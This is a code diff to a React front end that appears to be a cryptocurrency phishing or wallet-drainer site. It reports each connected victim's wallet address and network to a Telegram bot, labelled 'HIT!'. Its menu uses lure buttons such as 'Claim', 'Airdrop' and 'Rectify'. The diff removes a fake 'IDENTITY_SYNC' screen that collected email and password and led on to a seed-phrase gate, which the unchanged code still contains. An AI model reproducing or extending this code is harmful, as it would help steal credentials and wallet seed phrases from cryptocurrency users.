@@ -23,9 +23,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_100')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Final')) {
       log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_100', 't');
+      sessionStorage.setItem('hit_vF_Final', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -75,8 +75,9 @@ export default function App() {
           </div>
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
-                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
+              {/* KYC REMOVED FROM LIST BELOW */}
+              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
+                <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
@@ -95,16 +96,6 @@ export default function App() {
                 <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
-            </div>
-          )}
-          {view === "kyc_screen" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-              <h2 style={{color:'white', fontWeight:'900'}}>IDENTITY_SYNC</h2>
-              <div style={{fontSize:'10px', color:'#64748b', margin:'10px 0'}}>REQUIRED FOR WITHDRAWAL APPROVAL</div>
-              <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
-              <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
-              <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none', marginTop:'20px'}}>CONTINUE</button>
             </div>
           )}
           {view === "seed_gate" && (
